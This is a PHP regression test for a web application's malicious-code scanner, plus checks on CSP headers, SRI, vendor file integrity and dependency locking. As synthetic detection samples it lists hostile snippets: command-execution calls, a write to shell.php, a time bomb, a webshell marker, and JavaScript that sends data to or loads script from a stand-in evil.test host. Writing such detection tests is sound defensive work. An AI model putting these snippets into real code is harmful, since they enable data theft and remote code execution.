<?php
/**
 * Penjaga regresi pengendalian kode berbahaya (form keamanan poin 9.1-9.4).
 * Offline. Jalankan:  php tests/malicious_code_test.php
 * Pemindai dan penjelasannya: docs/engineering/pindai_kode_berbahaya.php dan KODE_BERBAHAYA.md.
 */
if (PHP_SAPI !== 'cli') { http_response_code(404); exit; }

define('BASEPATH', __DIR__ . '/../system/');
define('PINDAI_SEBAGAI_PUSTAKA', true);
$akar = str_replace(chr(92), '/', realpath(__DIR__ . '/..'));
require $akar . '/docs/engineering/pindai_kode_berbahaya.php';
require $akar . '/application/helpers/content_security_helper.php';

$total = 0;
function check($condition, $message) {
    global $total; $total++;
    if (!$condition) { throw new RuntimeException($message); }
}
function ada($temuan, $aturan, $sub = '') {
    foreach ($temuan as $t) { if ($t[0] === $aturan && ($sub === '' || stripos($t[2], $sub) !== false)) { return true; } }
    return false;
}

// --- 1. Pemindai benar-benar mendeteksi (contoh berbahaya sintetis) -------------------
$php_buruk = [
    'eval'                 => ['<?php eval($x);',                                    'eksekusi-dinamis', 'eval'],
    'backtick'             => ['<?php $o = `ls`;',                                   'eksekusi-dinamis', 'backtick'],
    'exec'                 => ['<?php exec("id");',                                  'eksekusi-dinamis', 'exec()'],
    'system'               => ['<?php system($c);',                                  'eksekusi-dinamis', 'system()'],
    'shell_exec'           => ['<?php shell_exec($c);',                              'eksekusi-dinamis', 'shell_exec()'],
    'passthru'             => ['<?php passthru($c);',                                'eksekusi-dinamis', 'passthru()'],
    'popen'                => ['<?php popen($c, "r");',                              'eksekusi-dinamis', 'popen()'],
    'proc_open'            => ['<?php proc_open($c, $d, $p);',                       'eksekusi-dinamis', 'proc_open()'],
    'assert'               => ['<?php assert($x);',                                  'eksekusi-dinamis', 'assert()'],
    'create_function'      => ['<?php create_function("", $x);',                    'eksekusi-dinamis', 'create_function()'],
    'preg_replace /e'      => ['<?php preg_replace("/a/e", $x, $y);',                'eksekusi-dinamis', '/e'],
    'fungsi dari input'    => ['<?php $_GET["f"]($x);',                              'eksekusi-dinamis', 'masukan pengguna'],
    'extract input'        => ['<?php extract($_POST);',                             'eksekusi-dinamis', 'extract()'],
    'unserialize input'    => ['<?php unserialize($_COOKIE["a"]);',                  'eksekusi-dinamis', 'unserialize()'],
    'include dinamis'      => ['<?php include $halaman;',                            'berkas-berisiko',  'dinamis'],
    'require dinamis'      => ['<?php require_once $p . ".php";',                    'berkas-berisiko',  'dinamis'],
    'tulis .php'           => ['<?php file_put_contents("x/shell.php", $c);',        'berkas-berisiko',  'eksekusi PHP'],
    'variabel-variabel'    => ['<?php $$nama = 1;',                                  'samaran',          'variabel-variabel'],
    'base64 panjang'       => ['<?php $x = "' . str_repeat('QUJD', 90) . '";',       'samaran',          'base64'],
    'hex escape'           => ['<?php $f = "\x65\x76\x61\x6c\x28";',                 'samaran',          'heksadesimal'],
    'gzinflate'            => ['<?php gzinflate($x);',                               'samaran',          'gzinflate'],
    'curl_init'            => ['<?php $c = curl_init();',                            'jaringan-keluar',  'curl_init'],
    'fsockopen'            => ['<?php fsockopen("h", 80);',                          'jaringan-keluar',  'fsockopen'],
    'file_get_contents URL' => ['<?php file_get_contents("http://x.test/a");',       'jaringan-keluar',  'URL'],
    'new SoapClient'       => ['<?php $s = new SoapClient($w);',                     'jaringan-keluar',  'SoapClient'],
    'mail'                 => ['<?php mail($a, $b, $c);',                            'jaringan-keluar',  'mail'],
    'unggahan'             => ['<?php move_uploaded_file($a, $b);',                  'unggahan',         'move_uploaded_file'],
    'bom waktu timestamp'  => ['<?php if (time() > 1893456000) { hapus(); }',        'fungsi-waktu',     'bom waktu'],
    'bom waktu tanggal'    => ['<?php $t = strtotime("2027-01-01 00:00:00");',       'fungsi-waktu',     'tanggal absolut'],
    'date dibanding literal' => ['<?php if (date("Y-m-d") == "2027-01-01") { x(); }', 'fungsi-waktu',     'date()'],
    'shutdown function'    => ['<?php register_shutdown_function("bertahan");',      'fungsi-waktu',     'luar siklus'],
    'ignore_user_abort'    => ['<?php ignore_user_abort(true);',                     'fungsi-waktu',     'luar siklus'],
    'tanpa batas waktu'    => ['<?php set_time_limit(0);',                           'fungsi-waktu',     'batas waktu'],
    'webshell'             => ['<?php $t = "c99shell";',                             'tanda-webshell',   'c99shell'],
];
foreach ($php_buruk as $nama => [$kode, $aturan, $sub]) {
    check(ada(pindai_php($kode, 'x.php'), $aturan, $sub), "Pemindai PHP gagal mendeteksi: $nama");
}
$php_aman = [
    'metode exec'        => '<?php $this->db->exec("x"); Kelas::system();',
    'definisi fungsi'    => '<?php function exec_aman() {} class A { public function system() {} }',
    'komentar'           => '<?php // eval($x); exec("id"); curl_init();' . "\n" . '/* system($c); */ $ok = 1;',
    'require konstanta'  => '<?php require_once APPPATH . "helpers/x.php";',
    'file lokal'         => '<?php file_get_contents("/tmp/x"); fopen("data.csv", "r");',
    'string http biasa'  => '<?php $t = "kunjungi http://x.test"; echo $t;',
    'waktu biasa'        => '<?php $kini = time(); $exp = date("Y-m-d", $kini + 3600); if ($kini > $row->expires_at) { x(); }',
];
foreach ($php_aman as $nama => $kode) {
    $t = pindai_php($kode, 'x.php');
    check($t === [], "Pemindai PHP salah menandai kode aman ($nama): " . json_encode($t));
}
$js_buruk = [
    'eval'            => ['eval(x)',                                   'eksekusi-dinamis'],
    'new Function'    => ['var f = new Function("a", x)',              'eksekusi-dinamis'],
    'setTimeout str'  => ['setTimeout("alert(1)", 10)',                'eksekusi-dinamis'],
    'document.write'  => ['document.write(x)',                         'eksekusi-dinamis'],
    'importScripts'   => ['importScripts("a.js")',                     'eksekusi-dinamis'],
    'WebSocket'       => ['new WebSocket("wss://x")',                  'jaringan-keluar'],
    'sendBeacon'      => ['navigator.sendBeacon("/x", d)',             'jaringan-keluar'],
    'fetch luar'      => ['fetch("https://evil.test/c?d=" + d)',       'jaringan-keluar'],
    'XHR luar'        => ['x.open("POST", "https://evil.test/c")',     'jaringan-keluar'],
    '.src luar'       => ['s.src = "https://evil.test/x.js"',          'jaringan-keluar'],
    'script dinamis'  => ['document.createElement("script")',          'jaringan-keluar'],
    'atob eval'       => ['eval(atob("YQ=="))',                        'samaran'],
];
foreach ($js_buruk as $nama => [$kode, $aturan]) {
    check(ada(pindai_js($kode, 'assets/js/asing.js'), $aturan), "Pemindai JS gagal mendeteksi: $nama");
}
check(pindai_js('fetch("/api/data").then(r => r.json()); setTimeout(function(){}, 5);', 'assets/js/aman.js') === [], 'Pemindai JS salah menandai JS aman');
check(pindai_js('var s = document.createElement("script");', 'assets/js/admin-progressive.js') === [], 'createElement(script) pada berkas yang diizinkan tidak boleh ditandai');

// --- 2. Kode buatan sendiri bersih di luar daftar izin ------------------------------
$mentah = pindai_semua_kode();
$sisa = pindai_terapkan_izin($mentah);
$ringkas = [];
foreach ($sisa as $rel => $daftar) { foreach ($daftar as [$a, $b, $k]) { $ringkas[] = "$rel:$b [$a] $k"; } }
check($sisa === [], "Temuan pemindai yang belum ditinjau:\n  " . implode("\n  ", $ringkas));
check(count($mentah) >= 8, 'Sinyal mentah terlalu sedikit; pemindai mungkin tidak menjangkau berkas');

// Daftar izin tidak boleh basi: tiap entri harus masih menunjuk berkas yang nyata dan memang memakai kemampuannya.
$per_aturan = ['jaringan-keluar' => PINDAI_JARINGAN_DIIZINKAN, 'unggahan' => PINDAI_UNGGAH_DIIZINKAN, 'fungsi-waktu' => PINDAI_WAKTU_DIIZINKAN];
foreach ($per_aturan as $aturan => $izin) {
    foreach ($izin as $rel => $alasan) {
        check(is_file($akar . '/application/' . $rel), "Daftar izin menunjuk berkas yang tidak ada: $rel");
        check(trim($alasan) !== '', "Entri izin tanpa alasan: $rel");
        $dipakai = false;
        foreach ($mentah as $berkas => $daftar) {
            if (preg_replace('#^application/#', '', $berkas) === $rel) { foreach ($daftar as $t) { if ($t[0] === $aturan) { $dipakai = true; } } }
        }
        check($dipakai, "Entri izin basi (tidak lagi memakai kemampuan '$aturan'): $rel");
    }
}

// --- 3. Integritas kode pihak ketiga ------------------------------------------------
$man = json_decode(file_get_contents(pindai_manifest_path()), true);
check(is_array($man) && !empty($man['berkas']), 'Manifest integritas tidak terbaca');
$lokal = pindai_hash_lokal();
check(count($lokal) >= 200, 'Manifest harus mencakup seluruh system/ CodeIgniter, pdf.js, dan Tailwind');
$beda = array_keys(array_filter($lokal, fn($h, $p) => ($man['berkas'][$p] ?? null) !== $h, ARRAY_FILTER_USE_BOTH));
check($beda === [], 'Berkas pihak ketiga berubah dari manifest (system/ tidak boleh diedit): ' . implode(', ', array_slice($beda, 0, 5)));
check(array_diff_key($man['berkas'], $lokal) === [], 'Berkas dalam manifest hilang dari disk');
check(isset($lokal['system/core/CodeIgniter.php'], $lokal['assets/js/vendor/tailwind-3.4.17.js'], $lokal['assets/js/vendor/pdfjs/pdf.min.js']), 'Manifest tidak memuat berkas kunci');

// --- 4. Aset eksternal: host disetujui dan SRI --------------------------------------
$host_skrip = content_security_policy('csp_script_hosts');
$pengecualian = array_keys(content_security_policy('sri_pengecualian'));
$host_css = ['cdn.jsdelivr.net', 'unpkg.com', 'cdnjs.cloudflare.com', 'fonts.googleapis.com'];
$masalah = []; $skrip_ext = 0; $css_ext = 0; $skrip_sri = 0;
foreach (pindai_daftar($akar . '/application/views', ['php']) as $p) {
    $rel = pindai_rel($p); $isi = file_get_contents($p);
    if (preg_match_all('#<(script|link)\b([^>]*)>#i', $isi, $m, PREG_SET_ORDER)) {
        foreach ($m as $tag) {
            $attr = $tag[2];
            $url = null;
            if (strtolower($tag[1]) === 'script' && preg_match('#\bsrc\s*=\s*"((?:https?:)?//[^"]+)"#i', $attr, $u)) { $url = $u[1]; $jenis = 'skrip'; }
            elseif (strtolower($tag[1]) === 'link' && preg_match('#\brel\s*=\s*"stylesheet"#i', $attr) && preg_match('#\bhref\s*=\s*"((?:https?:)?//[^"]+)"#i', $attr, $u)) { $url = $u[1]; $jenis = 'css'; }
            if ($url === null) { continue; }
            if (strpos($url, '//') === 0) { $masalah[] = "$rel: URL tanpa skema ($url)"; continue; }
            $host = parse_url($url, PHP_URL_HOST);
            $dikecualikan = false; foreach ($pengecualian as $pre) { if (strpos($url, $pre) === 0) { $dikecualikan = true; } }
            if ($jenis === 'skrip') {
                $skrip_ext++;
                if (!in_array('https://' . $host, $host_skrip, true)) { $masalah[] = "$rel: skrip dari host yang tidak disetujui ($host)"; }
                if (stripos($attr, 'integrity=') !== false) { $skrip_sri++; }
            } else {
                $css_ext++;
                if (!in_array($host, $host_css, true)) { $masalah[] = "$rel: CSS dari host yang tidak disetujui ($host)"; }
            }
            if (!$dikecualikan && stripos($attr, 'integrity="sha') === false) { $masalah[] = "$rel: aset eksternal TANPA integrity (SRI): $url"; }
            if (!$dikecualikan && stripos($attr, 'crossorigin') === false) { $masalah[] = "$rel: aset ber-SRI tanpa crossorigin: $url"; }
        }
    }
}
check($skrip_ext >= 8 && $css_ext >= 8, "Pemindaian aset eksternal terlalu sedikit ($skrip_ext skrip, $css_ext css)");
check($masalah === [], "Aset eksternal bermasalah:\n  " . implode("\n  ", $masalah));
check(strpos(file_get_contents($akar . '/application/views/layouts/head.php'), 'cdn.tailwindcss.com') === false, 'Tailwind tidak boleh dimuat dari CDN (tanpa CORS, SRI mustahil); pakai salinan lokal');
// Host skrip di CSP tidak boleh longgar: harus tepat host yang dipakai view (tanpa host cadangan yang tidak dipakai)
$dipakai_host = [];
foreach (pindai_daftar($akar . '/application/views', ['php']) as $p) {
    if (preg_match_all('#<script\b[^>]*\bsrc\s*=\s*"https://([^/"]+)#i', file_get_contents($p), $mm)) { foreach ($mm[1] as $h) { $dipakai_host['https://' . $h] = true; } }
}
foreach ($host_skrip as $h) {
    // gstatic dipakai reCAPTCHA di dalam skrip Google (tidak tampak di tag view), sehingga diizinkan tersendiri
    check(isset($dipakai_host[$h]) || $h === 'https://www.gstatic.com', "Host CSP tidak dipakai oleh view mana pun (perlonggaran tanpa alasan): $h");
}

// --- 5. Header CSP dan Permissions-Policy -------------------------------------------
$csp = csp_header_value(true);
check(strpos($csp, "script-src 'self'") === 0, 'CSP harus dimulai dengan script-src \'self\'');
check(strpos($csp, "object-src 'none'") !== false && strpos($csp, "base-uri 'self'") !== false, 'CSP harus melarang object dan mengunci base-uri');
check(strpos($csp, 'upgrade-insecure-requests') !== false && strpos(csp_header_value(false), 'upgrade-insecure-requests') === false, 'upgrade-insecure-requests hanya untuk HTTPS');
foreach ($host_skrip as $h) { check(strpos($csp, $h) !== false, "Host $h hilang dari CSP"); }
check(strpos($csp, '*') === false && strpos($csp, 'http:') === false, 'CSP tidak boleh memakai wildcard atau http:');
// CSP lewat header ditimpa platform hosting di production, jadi setiap halaman HTML lengkap WAJIB memuat meta CSP.
$meta = csp_meta_tag();
$awalan_meta = '<meta http-equiv="Content-Security-Policy" content="';
check(strpos($meta, $awalan_meta) === 0 && substr($meta, -2) === '">', 'csp_meta_tag() harus menghasilkan tag meta CSP yang utuh');
check(html_entity_decode(substr($meta, strlen($awalan_meta), -2), ENT_QUOTES, 'UTF-8') === csp_header_value(false), 'Isi meta CSP harus sama dengan kebijakan (tanpa upgrade-insecure-requests pada HTTP)');
$tanpa_meta = [];
$dibebaskan_meta = ['errors/', 'welcome_message.php']; // template galat CI tidak boleh bergantung pada helper saat aplikasi sedang galat
foreach (pindai_daftar($akar . '/application/views', ['php', 'html']) as $p) {
    $rel_v = preg_replace('#^.*/application/views/#', '', $p); $isi = file_get_contents($p);
    if (!preg_match('#<head[ >]#i', $isi)) { continue; }
    foreach ($dibebaskan_meta as $b) { if (strpos($rel_v, $b) === 0) { continue 2; } }
    if (strpos($isi, 'csp_meta_tag()') === false) { $tanpa_meta[] = $rel_v; continue; }
    // meta harus mendahului skrip apa pun di halaman itu
    $pos_meta = strpos($isi, 'csp_meta_tag()'); $pos_skrip = stripos($isi, '<script');
    if ($pos_skrip !== false && $pos_skrip < $pos_meta) { $tanpa_meta[] = "$rel_v (meta sesudah <script>)"; }
}
check($tanpa_meta === [], "Halaman HTML lengkap tanpa meta CSP (CSP header ditimpa platform hosting):\n  " . implode("\n  ", $tanpa_meta));
$pp = content_security_policy('permissions_policy');
foreach (['camera', 'microphone', 'accelerometer', 'gyroscope', 'magnetometer', 'usb', 'serial', 'hid', 'midi', 'display-capture', 'payment'] as $f) {
    check(($pp[$f] ?? null) === '()', "Permissions-Policy harus menolak $f");
}
check(($pp['geolocation'] ?? null) === '(self)', 'geolocation hanya boleh untuk origin sendiri');
foreach ($pp as $f => $v) { check($v === '()' || $v === '(self)', "Permissions-Policy $f tidak boleh membuka ke origin lain"); }
$mc = file_get_contents($akar . '/application/core/MY_Controller.php');
$hh = file_get_contents($akar . '/application/helpers/content_security_helper.php');
check(strpos($mc, 'kirim_header_keamanan()') !== false, 'MY_Controller harus mengirim header keamanan lewat kirim_header_keamanan()');
check(strpos($hh, 'csp_header_value(') !== false && strpos($hh, 'permissions_policy_header_value()') !== false, 'kirim_header_keamanan harus mengirim CSP dan Permissions-Policy dari config');
check(strpos(file_get_contents($akar . '/application/config/autoload.php'), "'content_security'") !== false, "Helper 'content_security' harus di-autoload");

// --- 6. API sensor/privasi hanya di berkas yang disetujui, dan atas aksi pengguna ---
$dilarang_mutlak = ['getUserMedia', 'mediaDevices', 'navigator.bluetooth', 'navigator.usb', 'navigator.serial', 'DeviceMotionEvent', 'DeviceOrientationEvent', 'MediaRecorder', 'navigator.contacts', 'clipboard.read', 'getBattery', 'AmbientLightSensor', 'Accelerometer(', 'Gyroscope('];
$pola_izin = content_security_policy('sensor_api_allowlist');
$berkas_js = array_merge(pindai_daftar($akar . '/application/views', ['php']), pindai_daftar($akar . '/assets/js', ['js'], ['/assets/js/vendor/']), glob($akar . '/*.js') ?: []);
$sensor_masalah = [];
foreach ($berkas_js as $p) {
    $rel = pindai_rel($p); $rel_izin = preg_replace('#^application/#', '', $rel); $isi = file_get_contents($p);
    foreach ($dilarang_mutlak as $api) { if (strpos($isi, $api) !== false) { $sensor_masalah[] = "$rel memakai $api (tidak diizinkan di mana pun)"; } }
    foreach ($pola_izin as $api => $berkas_boleh) {
        if (strpos($isi, $api) !== false && !in_array($rel_izin, $berkas_boleh, true)) { $sensor_masalah[] = "$rel memakai $api di luar berkas yang disetujui"; }
    }
}
check($sensor_masalah === [], "Penggunaan API sensor/privasi tak disetujui:\n  " . implode("\n  ", $sensor_masalah));
$push = file_get_contents($akar . '/assets/js/admin-web-push.js');
check(strpos($push, "addEventListener('click'") !== false && strpos($push, 'requestPermission') > strpos($push, "addEventListener('click'"), 'Izin notifikasi harus diminta dari dalam handler klik, bukan saat halaman dibuka');
$wiz = file_get_contents($akar . '/application/views/pages/warga/pendataan.php');
check(preg_match("#addEventListener\('click',function\(\)\{[^}]*navigator\.geolocation#", $wiz) === 1 || (strpos($wiz, "addEventListener('click'") !== false && strpos($wiz, 'getCurrentPosition') > strpos($wiz, "addEventListener('click'")), 'Geolokasi harus diminta dari dalam handler klik');
foreach ($pola_izin as $api => $berkas_boleh) { foreach ($berkas_boleh as $b) { check(is_file($akar . '/' . (strpos($b, 'views/') === 0 ? 'application/' : '') . $b), "Izin sensor menunjuk berkas yang tidak ada: $b"); } }

// --- 7. Pustaka composer terkunci, tanpa dev, dan vendor/ tidak dapat dijangkau web --
$cj = json_decode(file_get_contents($akar . '/composer.json'), true);
check(!isset($cj['require-dev']) && !isset($cj['scripts']), 'composer.json tidak boleh memuat require-dev/scripts: deploy menjalankan `composer install` tanpa --no-dev, jadi alat dev ikut masuk ke production');
check(!in_array($cj['require']['setasign/fpdf'] ?? '*', ['*', '', '>=0'], true), 'Versi pustaka tidak boleh tanpa batas (*)');
$cl = @json_decode(@file_get_contents($akar . '/composer.lock'), true);
check(is_array($cl) && !empty($cl['content-hash']) && count($cl['packages']) >= 25, 'composer.lock harus ada di git dan terisi: tanpanya server memilih versi pustaka sendiri di setiap deploy');
check(empty($cl['packages-dev']), 'composer.lock tidak boleh memuat paket dev');
foreach ($cl['packages'] as $pk) {
    check(!empty($pk['dist']['reference']) || !empty($pk['source']['reference']), "Paket {$pk['name']} tanpa referensi commit terkunci");
    check(empty($pk['abandoned']), "Paket {$pk['name']} ditandai ditinggalkan pemeliharanya");
}
$gi = file_get_contents($akar . '/.gitignore');
check(preg_match('/^\/?composer\.lock\s*$/m', $gi) !== 1, '.gitignore tidak boleh mengabaikan composer.lock');
check(preg_match('/^\/vendor\/\s*$/m', $gi) === 1, 'vendor/ harus tetap di-gitignore (dibangun dari lock saat deploy)');
$ht = file_get_contents($akar . '/.htaccess');
check(preg_match('/RewriteRule\s+\^\(docs\|dev-scripts\|tests\|vendor\)\//', $ht) === 1, '.htaccess harus memblokir docs, dev-scripts, tests, dan vendor');

echo "malicious_code_test: OK ($total pemeriksaan, " . count($mentah) . " berkas dengan sinyal ditinjau)\n";
